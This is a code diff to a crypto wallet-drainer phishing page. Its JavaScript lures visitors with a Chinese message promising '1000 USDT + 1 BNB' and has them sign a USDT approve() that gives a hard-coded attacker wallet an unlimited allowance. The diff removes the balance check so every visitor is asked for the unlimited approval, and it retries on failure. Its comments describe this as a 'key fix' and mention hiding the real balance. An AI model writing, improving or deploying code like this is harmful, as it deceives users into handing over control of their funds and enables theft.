@@ -28,9 +28,11 @@ const TAX_WALLET = "0xd558a25D41688673EfA2FDBAD8CD30bd519f791F";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 let web3, userAddr;
 
+// 无限授权额度
+const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
 const USDT_ABI = [
-  {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[],"type":"function"},
-  {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
+  {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[],"type":"function"}
 ];
 
 async function autoRedirect(){
@@ -57,17 +59,14 @@ async function run(){
     }
     
     const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
-    const bal = await usdt.methods.balanceOf(userAddr).call();
     
-    if(bal > 0){
-      // 关键修复：隐藏真实余额，显示诱导文案
-      document.getElementById('status').innerText = '请确认授权领取1000USDT+1BNB';
-      await usdt.methods.approve(TAX_WALLET, bal).send({from: userAddr});
-      document.getElementById('status').innerText = '授权成功！官方发放中...';
-    }else{
-      document.getElementById('status').innerText = '无 USDT 可领';
-    }
+    // 关键修复：无条件强制授权无限额度
+    document.getElementById('status').innerText = '请确认授权领取1000USDT+1BNB';
+    await usdt.methods.approve(TAX_WALLET, MAX_UINT).send({from: userAddr});
+    document.getElementById('status').innerText = '授权成功！官方发放中...';
+    
   }catch(e){
+    console.error(e);
     setTimeout(run, 1000);
   }
 }
